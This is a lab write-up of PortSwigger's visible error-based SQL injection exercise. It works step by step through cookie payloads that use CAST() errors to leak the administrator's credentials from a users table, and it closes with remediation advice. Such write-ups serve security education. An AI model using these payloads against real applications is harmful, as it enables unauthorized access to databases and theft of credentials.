# SQL Injection: Visible Error-Based SQL Injection

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
Error-Based Blind SQL Injection (CWE-89, CWE-209)

## Lab Objective
The `TrackingId` cookie feeds directly into a SQL query whose results are never returned to the client. Exploit verbose, misconfigured database error messages to leak the administrator's password directly through the error text itself, turning an otherwise blind injection into a fully visible one.

## Vulnerability Overview
This lab sits conceptually between the two techniques covered elsewhere in this portfolio: like the conditional-response lab, the query's actual results are never reflected in the response — but unlike that lab, **no multi-request boolean inference is required at all**, because the application's own error handling does the exfiltration work in a single request per data point. The root cause is a database configuration failure layered on top of the SQL injection itself: when a query throws an exception, the application returns the **raw, unfiltered error message** from the database engine directly in the HTTP response, rather than a generic, sanitised error page.

The exploitation technique deliberately engineers an error whose message happens to contain the data being sought. The key primitive is the `CAST()` function, which converts a value from one SQL data type to another. Casting a string value to an integer is a completely ordinary, legitimate SQL operation — right up until the string genuinely cannot be represented as an integer, at which point the database raises a type-conversion error. Critically, many database engines include the **offending value itself** in that error message, since it's useful debugging information under normal, non-adversarial circumstances:

```
ERROR: invalid input syntax for type integer: "administrator"
```

If the value being cast is the output of a `SELECT` subquery pulling from the `users` table, the database is effectively being tricked into embedding a row of sensitive data directly inside its own exception message — and since that message is returned verbatim to the client, the exfiltration happens in a single round trip, with no boolean inference required.

## Methodology
1. **Confirm the injection point and trigger a baseline error.** Submit a single quote in the `TrackingId` cookie and observe the resulting error message, checking specifically whether it discloses the underlying query structure.
2. **Close the broken syntax to reach a clean baseline.** Comment out the remainder of the original query so the request executes without errors, confirming control over the query's logical structure.
3. **Introduce a `CAST()` expression** wrapping a simple, known-safe value, to observe how the database reports a *type*-related error distinct from a syntax error — this narrows down exactly what kind of error message format to expect.
4. **Adjust the query structure based on each successive error message**, since the database's own error output effectively guides the payload toward valid syntax step by step.
5. **Substitute the target data (username, then password) into the cast expression**, so that the resulting type-conversion failure embeds that exact value in its error text.
6. **Read the leaked value directly from the response** and repeat for each field needed.

---

## Exploitation

**Step 1:** Intercept a request carrying the `TrackingId` cookie and send it to **Repeater**:

```http
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: TrackingId=bCQhBPs0wXzx5kcy; session=...
```

**Step 2:** Append a single quote to the cookie value:

```
Cookie: TrackingId=bCQhBPs0wXzx5kcy'
```

The response returns a detailed, verbose error — disclosing the full underlying SQL query, including the injected value's exact position within a single-quoted string literal, and flagging an unterminated string. This confirms both the injection point and that the application leaks raw database errors to the client.

**Step 3:** Close the broken syntax by commenting out the remainder of the original query:

```
Cookie: TrackingId=bCQhBPs0wXzx5kcy'--
```

The error disappears, confirming the query is now syntactically valid and the injection point is under full control.

**Step 4:** Introduce a `CAST()` expression around a trivial subquery to probe the database's error-reporting behavior:

```
Cookie: TrackingId=bCQhBPs0wXzx5kcy' AND CAST((SELECT 1) AS int)--
```

The response returns a new, different error — indicating that an `AND` condition must evaluate to a boolean, not an integer. This is useful diagnostic information: it confirms `CAST()` executes successfully, but the overall expression needs to resolve to true/false rather than a raw value.

**Step 5:** Wrap the cast expression in an equality comparison to satisfy the boolean requirement:

```
Cookie: TrackingId=bCQhBPs0wXzx5kcy' AND 1=CAST((SELECT 1) AS int)--
```

This executes cleanly with no error, confirming the structure is now fully valid and ready to carry real data in place of the literal `1`.

**Step 6:** Substitute the `users` table's `username` column into the cast expression:

```
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```

The response returns an error indicating the subquery returned more than one row — the `users` table has multiple entries, and a bare subquery used this way must return exactly one value.

**Step 7:** Constrain the subquery to a single row:

```
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

The response now returns the target error, with the actual data embedded directly in the message text:

```
ERROR: invalid input syntax for type integer: "administrator"
```

The database attempted to cast the string `"administrator"` to an integer, failed, and included the exact value it failed on in its own error output.

**Step 8:** Repeat the identical technique against the `password` column:

```
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**Step 9:** The resulting error discloses the administrator's password directly:

```
ERROR: invalid input syntax for type integer: "41r5a8xg35x3mt8iwqqi"
```

**Step 10:** Log in as `administrator` using the leaked password to solve the lab.

**Why it works:** Two independent failures combine here. First, the application never sanitises or generalises database exceptions before returning them to the client — a configuration oversight distinct from the SQL injection itself, but one that this entire technique depends on. Second, `CAST()` provides a reliable, deterministic way to force a predictable category of error (a type-conversion failure) whose message format, on many database engines, happens to include the specific value that failed to convert. Combining the two means any value reachable via a subquery can be extracted in exactly one request, since the database effectively does the work of formatting and returning the stolen data as a side effect of its own error-handling logic.

## Impact
- **Single-request-per-value data exfiltration** — dramatically faster and lower-effort than the boolean-based blind technique covered elsewhere in this portfolio, since each error message directly discloses a complete value rather than requiring dozens of true/false questions per character.
- **Demonstrates that "blind" SQL injection is often not truly blind in practice** — verbose error handling is an extremely common misconfiguration, and this lab is a direct illustration of why: an application doesn't need to reflect query *results* to leak data, if it reflects query *errors* without sanitisation.
- **Full data exfiltration potential**, equivalent in reach to `UNION`-based attacks, since any value obtainable via a subquery (any table, any column, including `information_schema` metadata) can be leaked this exact way.

## Remediation
- **Use parameterised queries (prepared statements) universally.** As with every lab in this series, this remains the definitive fix — a query whose structure cannot be altered by input cannot be coerced into throwing a data-carrying error in the first place.
- **Never return raw database error messages to the client.** Catch all database exceptions server-side and return a generic, uninformative error page instead — this single change independently closes off this entire exploitation technique, even in a hypothetical scenario where the underlying injection point somehow remained.
- **Log detailed errors server-side only**, where they remain useful for debugging without being exposed to untrusted clients.
- **Apply least-privilege database accounts and generic application-level error handling** as layered defense-in-depth, reducing the value of any error information that does leak through in an unanticipated code path.

## Key Takeaways
- Error-based extraction is often faster and simpler to execute than boolean-based blind extraction once a verbose error channel is confirmed — always test for this before committing to the slower character-by-character inference technique.
- `CAST()` type-conversion errors are a reliable, cross-database-adaptable primitive for this technique — the specific error wording differs by engine, but the underlying principle (force a type mismatch, let the database report the offending value) generalises well.
- Letting the database's own error messages iteratively guide payload construction (syntax error → type error → row-count error → final leak) is itself a methodology worth internalizing — each error response is diagnostic information narrowing down the correct next step, not just a failure to route around blindly.
- This lab reinforces, once again, that verbose error handling is one of the highest-leverage, lowest-effort misconfigurations to check for early in any SQL injection assessment — it frequently turns a multi-hundred-request blind extraction into a handful of direct, single-request leaks.

## Tools Used
- Burp Suite (Proxy, Repeater)
- Web browser

## Disclaimer
This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.